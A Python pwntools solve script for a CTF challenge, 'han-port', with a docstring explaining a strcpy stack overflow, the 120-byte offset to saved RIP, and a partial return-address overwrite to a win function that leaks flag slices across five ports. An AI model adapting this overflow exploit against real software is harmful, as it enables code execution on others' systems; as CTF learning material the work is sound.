#!/usr/bin/env python3
"""
Solve script for han-port CTF challenge.

Vulnerability
-------------
handle_set_param() in handler.c contains:

    char value[PARAM_VALUE_MAX];   /* 64-byte stack buffer */
    strcpy(value, sp + 1);         /* no bounds check — overflow here */

Stack layout of handle_set_param (-O2 -fno-inline, -fno-stack-protector):

    [rsp + 0x10]  value[0..63]          64 bytes  ← strcpy destination
                  (locals / padding)    32 bytes
    [rsp + 0x58]  saved rbx              8 bytes
    [rsp + 0x60]  saved rbp              8 bytes
    [rsp + 0x68]  saved r12              8 bytes
    [rsp + 0x70]  saved r13              8 bytes
    [rsp + 0x78]  saved r14              8 bytes
    [rsp + 0x80]  saved r15              8 bytes
    [rsp + 0x88]  saved RIP ← target   (offset 120 from value[0])

Win function
------------
print_flag_snippet() at a fixed address (-no-pie): resolved dynamically from ELF.
    Prints the flag slice stored in this child process, then exit(0).

Exploit flow
------------
strcpy stops at the first NUL byte, so we send:

    b'A' * 120 + win_addr[:3]

The upper 5 bytes of saved RIP are already \\x00 (binary lives below 4 GB),
so the result is saved RIP = win_addr.  ✓

Sentinel
--------
The sentinel "." is emitted by meter_handler *after* the handler function
returns.  Compiled with -fno-inline, handle_set_param has its own frame,
so its corrupted ret fires before meter_handler's epilogue runs — meter_handler
never reaches puts(".").  port_send in the parent reads "OK\n" then
"Meter secret: <snippet>\n" then EOF (child exited), all in one shot.

Flag assembly
-------------
The parent split FLAG into 5 equal slices (one per port) and zeroed its
copy.  We must pwn all 5 ports and concatenate the snippets in order.
"""

import sys
from pwn import *

# ── constants ────────────────────────────────────────────────────────────────

BINARY   = './han-port'  # built by `make handout` (Docker/Ubuntu gcc, placeholder flag)
HOST     = '127.0.0.1'
PORT     = 50000

OFFSET   = 120        # bytes from value[0] to saved RIP
                      # verify with: lea 0x10(%rsp),%rdi before strcpy → 0x88-0x10=120

# ── dynamic resolution ───────────────────────────────────────────────────────

elf = ELF(BINARY, checksec=False)
WIN_ADDR = elf.symbols['print_flag_snippet']
log.info(f'print_flag_snippet @ {hex(WIN_ADDR)}')

# ── exploit helpers ──────────────────────────────────────────────────────────

def build_payload() -> bytes:
    """
    Overflow value[64], clobber saved regs + rbp, overwrite saved RIP.

    strcpy stops at the first NUL, so we only send the low 3 bytes of
    WIN_ADDR (which is below 4 GB, so upper 5 bytes are already zero).
    """
    win_le = p64(WIN_ADDR)
    return b'A' * OFFSET + win_le[:3]  # stop before first NUL


def get_num_ports(conn: tube) -> int:
    """Parse the number of ports from the 'list' command output."""
    conn.sendline(b'list')
    resp = conn.recvuntil(b'\n> ').decode(errors='replace')
    # Count lines that start with a space and a digit (port table rows)
    count = sum(
        1 for line in resp.splitlines()
        if line.lstrip().startswith(tuple('0123456789'))
    )
    log.info(f'Detected {count} ports')
    return count


def exploit_port(conn: tube, port_idx: int) -> str:
    """
    Exploit the SET_PARAM overflow on port `port_idx`.
    Returns the flag snippet owned by that child process.
    """
    log.info(f'Attacking port {port_idx} …')

    # Select the port
    conn.sendline(f'select {port_idx}'.encode())
    conn.recvuntil(b'\n> ')

    # Send the exploit payload.
    # handle_set_param's corrupted ret fires before meter_handler returns, so
    # meter_handler never emits its "." sentinel.  port_send in the parent
    # reads "OK\n" + "Meter secret: ...\n" + EOF — all in one response.
    payload = build_payload()
    conn.sendline(b'send SET_PARAM x ' + payload)
    resp = conn.recvuntil(b'\n> ')

    for line in resp.split(b'\n'):
        if b'Meter secret:' in line:
            snippet = line.split(b'Meter secret: ', 1)[1].strip().decode()
            log.success(f'  port {port_idx} → {snippet!r}')
            return snippet

    log.warning(f'  port {port_idx}: no Meter secret line found in: {resp!r}')
    return ''


# ── main ─────────────────────────────────────────────────────────────────────

def main():
    remote_mode = len(sys.argv) > 1 and sys.argv[1] == 'remote'

    if remote_mode:
        conn = remote(HOST, PORT)
    else:
        conn = process(BINARY)

    conn.recvuntil(b'exit\n\n> ')   # discard banner + first prompt

    num_ports = get_num_ports(conn)

    snippets = []
    for i in range(num_ports):
        snippet = exploit_port(conn, i)
        snippets.append(snippet)

    flag = ''.join(snippets)
    log.success(f'Flag: {flag}')

    conn.close()


if __name__ == '__main__':
    main()
